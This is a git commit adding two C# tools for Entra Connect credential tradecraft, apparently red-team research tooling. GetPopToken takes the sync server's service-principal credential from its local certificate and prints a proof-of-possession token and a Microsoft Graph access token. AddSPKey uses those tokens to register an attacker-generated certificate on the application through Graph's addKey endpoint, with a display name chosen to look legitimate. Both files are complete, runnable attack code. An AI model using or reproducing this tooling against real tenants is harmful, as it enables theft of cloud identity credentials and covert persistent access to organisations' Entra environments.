0a54522ede9a2f1edeaa9b81d07736bb9c200d70
Daniel Heinsen <hotnops@protonmail.com>
2025-06-05 10:17:48 -0700

    Adding some c# assemblies for Entra Connect credential tradecraft

---
+++ SharpECUtils/AddSPKey/Program.cs
@@ -0,0 +1,159 @@
+﻿using System;
+using System.IO;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Text;
+using System.Threading.Tasks;
+using Newtonsoft.Json;
+
+public class KeyCredentialModel
+{
+    // Token: 0x17000074 RID: 116
+    // (get) Token: 0x0600018C RID: 396 RVA: 0x00006A45 File Offset: 0x00004C45
+    // (set) Token: 0x0600018D RID: 397 RVA: 0x00006A4D File Offset: 0x00004C4D
+    [JsonProperty("customKeyIdentifier")]
+    public string CustomKeyIdentifier { get; set; }
+
+    // Token: 0x17000075 RID: 117
+    // (get) Token: 0x0600018E RID: 398 RVA: 0x00006A56 File Offset: 0x00004C56
+    // (set) Token: 0x0600018F RID: 399 RVA: 0x00006A5E File Offset: 0x00004C5E
+    [JsonProperty("displayName")]
+    public string DisplayName { get; set; }
+
+    // Token: 0x17000076 RID: 118
+    // (get) Token: 0x06000190 RID: 400 RVA: 0x00006A67 File Offset: 0x00004C67
+    // (set) Token: 0x06000191 RID: 401 RVA: 0x00006A6F File Offset: 0x00004C6F
+    [JsonProperty("endDateTime")]
+    public DateTimeOffset EndDateTime { get; set; }
+
+    // Token: 0x17000077 RID: 119
+    // (get) Token: 0x06000192 RID: 402 RVA: 0x00006A78 File Offset: 0x00004C78
+    // (set) Token: 0x06000193 RID: 403 RVA: 0x00006A80 File Offset: 0x00004C80
+    [JsonProperty("key")]
+    public byte[] Key { get; set; }
+
+    // Token: 0x17000078 RID: 120
+    // (get) Token: 0x06000194 RID: 404 RVA: 0x00006A89 File Offset: 0x00004C89
+    // (set) Token: 0x06000195 RID: 405 RVA: 0x00006A91 File Offset: 0x00004C91
+    [JsonProperty("keyId")]
+    public Guid? KeyId { get; set; }
+
+    // Token: 0x17000079 RID: 121
+    // (get) Token: 0x06000196 RID: 406 RVA: 0x00006A9A File Offset: 0x00004C9A
+    // (set) Token: 0x06000197 RID: 407 RVA: 0x00006AA2 File Offset: 0x00004CA2
+    [JsonProperty("startDateTime")]
+    public DateTimeOffset StartDateTime { get; set; }
+
+    // Token: 0x1700007A RID: 122
+    // (get) Token: 0x06000198 RID: 408 RVA: 0x00006AAB File Offset: 0x00004CAB
+    // (set) Token: 0x06000199 RID: 409 RVA: 0x00006AB3 File Offset: 0x00004CB3
+    [JsonProperty("type")]
+    public string Type { get; set; }
+
+    // Token: 0x1700007B RID: 123
+    // (get) Token: 0x0600019A RID: 410 RVA: 0x00006ABC File Offset: 0x00004CBC
+    // (set) Token: 0x0600019B RID: 411 RVA: 0x00006AC4 File Offset: 0x00004CC4
+    [JsonProperty("usage")]
+    public string Usage { get; set; }
+}
+
+namespace AddSPKey
+{
+    internal class Program
+    {
+        static async Task Main(string[] args)
+        {
+            if (args.Length != 4)
+            {
+                Console.WriteLine("Usage: AddKeyUploader <BearerToken> <Proof> <AppId> <OutputFile>");
+                return;
+            }
+
+            string bearerToken = args[0];
+            string proof = args[1];
+            string appId = args[2];
+            string outputFile = args[3];
+
+            // Generate the cert in memory
+            var cert = CertFactory.CreateMinimalGraphCompatibleCert();
+
+            // Save to disk
+            File.WriteAllBytes(outputFile, cert.Export(X509ContentType.Pfx));
+            Console.WriteLine($"[*] PFX saved to {outputFile}");
+
+            // Construct the Graph API payload
+            var keyId = Guid.NewGuid();
+
+            KeyCredentialModel keyCredential = new KeyCredentialModel
+            {
+                Type = "AsymmetricX509Cert",
+                Key = cert.GetRawCertData(),
+                Usage = "Verify",
+                StartDateTime = cert.NotBefore.ToUniversalTime(),
+                EndDateTime = cert.NotAfter.ToUniversalTime(),
+                DisplayName = "CN=Entra Connect Sync Provisioning",
+            };
+
+            string passwordCredential = null;
+
+
+            string json = JsonConvert.SerializeObject((object)new { keyCredential, proof, passwordCredential });
+
+            var client = new HttpClient();
+            client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);
+
+            string url = $"https://graph.microsoft.com/v1.0/applications(appId='{appId}')/addKey";
+
+            var response = await client.PostAsync(
+                url,
+                new StringContent(json, Encoding.UTF8, "application/json")
+            );
+
+            if (response.IsSuccessStatusCode)
+            {
+                Console.WriteLine($"[*] Successfully added key: {cert.Thumbprint}");
+            }
+            else
+            {
+                var error = await response.Content.ReadAsStringAsync();
+                Console.WriteLine($"[!] Failed to add key: {response.StatusCode}\n{error}");
+            }
+        }
+    }
+
+    public static class CertFactory
+    {
+        public static X509Certificate2 CreateMinimalGraphCompatibleCert()
+        {
+            using (RSA rsa = RSA.Create(2048))
+            {
+                var request = new CertificateRequest(
+                    "CN=Entra Connect Sync Provisioning",
+                    rsa,
+                    HashAlgorithmName.SHA256,
+                    RSASignaturePadding.Pkcs1);
+
+                // Only add required extensions
+                request.CertificateExtensions.Add(new X509EnhancedKeyUsageExtension(
+                    new OidCollection { new Oid("1.3.6.1.5.5.7.3.2") }, // Client Authentication
+                    critical: false));
+
+                request.CertificateExtensions.Add(new X509KeyUsageExtension(
+                    X509KeyUsageFlags.DigitalSignature, critical: false));
+
+                // No Subject Key Identifier
+
+                var cert = request.CreateSelfSigned(
+                    DateTimeOffset.UtcNow.AddMinutes(-5),
+                    DateTimeOffset.UtcNow.AddMonths(6));
+
+                return new X509Certificate2(
+                    cert.Export(X509ContentType.Pfx),
+                    (string)null,
+                    X509KeyStorageFlags.Exportable | X509KeyStorageFlags.EphemeralKeySet);
+            }
+        }
+    }
+}
---
+++ SharpECUtils/GetPopToken/Program.cs
@@ -0,0 +1,180 @@
+﻿using Microsoft.Azure.ActiveDirectory.AdsyncManagement.Server;
+using Microsoft.Online.Deployment.Client.Framework;
+using Microsoft.Online.Deployment.Client.Framework.Utility;
+using Microsoft.Online.Deployment.Framework;
+using Microsoft.Online.Deployment.PowerShell;
+using Microsoft.Online.Deployment.PowerShell.GraphResources;
+using Microsoft.Online.Deployment.PowerShell.GraphResources.Models;
+using Microsoft.Online.Deployment.PowerShell.Providers;
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Globalization;
+using System.Linq;
+using System.Net.Http;
+using System.Security.AccessControl;
+using System.Security.Cryptography;
+using System.Security.Cryptography.X509Certificates;
+using System.Security.Principal;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace GetPopToken
+{
+    internal class Program
+    {
+
+        private static X509Certificate2 CreateSelfSignedCertificate(bool useTpmProvider)
+        {
+            try
+            {
+                CngKeyCreationParameters cngKeyCreationParameters = new CngKeyCreationParameters();
+                cngKeyCreationParameters.KeyCreationOptions = CngKeyCreationOptions.None;
+                cngKeyCreationParameters.ExportPolicy = CngExportPolicies.None;
+                cngKeyCreationParameters.KeyUsage = CngKeyUsages.Signing;
+                if (useTpmProvider)
+                {
+                    cngKeyCreationParameters.Provider = new CngProvider("Microsoft Platform Crypto Provider");
+                }
+                else
+                {
+                    cngKeyCreationParameters.Provider = CngProvider.MicrosoftSoftwareKeyStorageProvider;
+                    string format = "D:PAI(A;;GR;;;{0})(A;ID;GR;;;SY)";
+                    string arg = WindowsIdentity.GetCurrent().User.ToString();
+                    string sddlForm = string.Format(CultureInfo.InvariantCulture, format, arg);
+                    CryptoKeySecurity cryptoKeySecurity = new CryptoKeySecurity(new CommonSecurityDescriptor(isContainer: false, isDS: false, sddlForm));
+                    CngProperty item = new CngProperty("Security Descr", cryptoKeySecurity.GetSecurityDescriptorBinaryForm(), (CngPropertyOptions)4);
+                    cngKeyCreationParameters.Parameters.Add(item);
+                }
+
+                CngProperty item2 = new CngProperty("Length", BitConverter.GetBytes(2048), CngPropertyOptions.None);
+                cngKeyCreationParameters.Parameters.Add(item2);
+                string keyName = Guid.NewGuid().ToString();
+                CngKey key = CngKey.Create(CngAlgorithm.Rsa, keyName, cngKeyCreationParameters);
+                RSA key2 = new RSACng(key);
+                CertificateRequest certificateRequest = new CertificateRequest(string.Format("CN={0}", "Entra Connect Sync Provisioning"), key2, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
+                X509EnhancedKeyUsageExtension item3 = new X509EnhancedKeyUsageExtension(new OidCollection
+            {
+                new Oid("1.3.6.1.5.5.7.3.2")
+            }, critical: false);
+                certificateRequest.CertificateExtensions.Add(item3);
+                X509KeyUsageExtension item4 = new X509KeyUsageExtension(X509KeyUsageFlags.DigitalSignature, critical: false);
+                certificateRequest.CertificateExtensions.Add(item4);
+                X509Certificate2 x509Certificate = certificateRequest.CreateSelfSigned(DateTimeOffset.UtcNow, DateTimeOffset.UtcNow.AddMonths(6));
+                CertificateUtility.AddCertificate(x509Certificate, StoreLocation.CurrentUser);
+                return x509Certificate;
+            }
+            catch (CryptographicException ex) when (useTpmProvider && (ex.HResult == -2146893776 || ex.HResult == -2146893771))
+            {
+                throw;
+            }
+            catch (Exception arg2)
+            {
+                Tracer.TraceError($"CreateSelfSignedCertificate::Error creating self-signed certificate. UseTpm: {useTpmProvider} Exception : {arg2}");
+                throw;
+            }
+        }
+
+        private static X509Certificate2 CreateSelfSignedCertificateNoTPM()
+        {
+
+            X509Certificate2 x509Certificate = CreateSelfSignedCertificate(false);
+            //string certificateSHA256HashString = CertificateUtility.GetCertificateSHA256HashString(x509Certificate);
+            //Tracer.TraceInformation(1013, string.Format("CreateSelfSignedCertificate:: Created certificate (CertificateThumbprint={0}, CertificateSHA256Hash={1}) with TPM crypto provider.", x509Certificate.Thumbprint, certificateSHA256HashString), Array.Empty<object>());
+            return x509Certificate;
+        }
+
+        private static Guid ValidateApplicationIdentity(string username)
+        {
+            Guid result;
+            string text;
+            if (!AzureAuthenticationProviderFactory.TryParseServicePrincipalCredentials(username, out result, out text))
+            {
+                throw new InvalidOperationException("Entra Connect Sync is not configured to use Application identity");
+            }
+            return result;
+        }
+
+        private static Guid AddApplicationKey(GraphApplication graphApplication, Guid applicationId, string proof, X509Certificate2 cert)
+        {
+            KeyCredentialModel keyCredential = new KeyCredentialModel
+            {
+                Type = "AsymmetricX509Cert",
+                Key = cert.GetRawCertData(),
+                Usage = "Verify",
+                StartDateTime = cert.NotBefore.ToUniversalTime(),
+                EndDateTime = cert.NotAfter.ToUniversalTime(),
+                DisplayName = "CN=Entra Connect Sync Provisioning"
+            };
+            return graphApplication.AddKey(applicationId, keyCredential, proof).KeyId.Value;
+        }
+
+        public static string GetSha256HashOfCertByIssuedTo(string issuedTo)
+        {
+            var storeLocations = new[] { StoreLocation.CurrentUser, StoreLocation.LocalMachine };
+            var storeNames = (StoreName[])Enum.GetValues(typeof(StoreName));
+
+            foreach (var location in storeLocations)
+            {
+                foreach (var storeName in storeNames)
+                {
+                    using (var store = new X509Store(storeName, location))
+                    {
+                        try
+                        {
+                            store.Open(OpenFlags.ReadOnly);
+                            foreach (var cert in store.Certificates)
+                            {
+                                if (cert.Subject.Equals($"CN={issuedTo}", StringComparison.OrdinalIgnoreCase))
+                                {
+                                    using (var sha256 = SHA256.Create())
+                                    {
+                                        byte[] hash = sha256.ComputeHash(cert.GetRawCertData());
+                                        return BitConverter.ToString(hash).Replace("-", "").ToLowerInvariant();
+                                    }
+                                }
+                            }
+                        }
+                        catch
+                        {
+                            // Skip inaccessible stores
+                            continue;
+                        }
+                    }
+                }
+            }
+
+            throw new Exception($"Certificate with Issued To '{issuedTo}' not found.");
+        }
+
+        static void Main(string[] args)
+        {
+
+            string client_id = args[0];
+            string tenant_name = args[1];
+
+            string username = $"{{{client_id}}}@{tenant_name}";
+            string password = GetSha256HashOfCertByIssuedTo("Entra Connect Sync Provisioning");
+
+            Guid guid = ValidateApplicationIdentity(username);
+
+            System.Security.SecureString secureString = new System.Security.SecureString();
+
+            foreach (char c in password)
+            {
+                secureString.AppendChar(c);
+            }
+
+            IAzureAuthenticationProvider azureAuthenticationProvider = AzureAuthenticationProviderFactory.CreateAzureAuthenticationProvider(username, secureString, InteractionMode.Desktop);
+            ProviderRegistry.Instance.RegisterProvider<IHttpClientProvider, HttpClientProvider>();
+            IHttpClient httpClient = ProviderRegistry.Instance.CreateInstance<IHttpClientProvider>(false, Array.Empty<object>()).CreateInstance();
+
+            string proof = azureAuthenticationProvider.GenerateProofOfPossessionToken(guid.ToString());
+
+            string error;
+            string token = azureAuthenticationProvider.AcquireServiceToken(AzureService.MSGraph, out error, false);
+            Console.WriteLine("POP: " + proof);
+            Console.WriteLine("Token: " + token);
+        }
+    }
+}
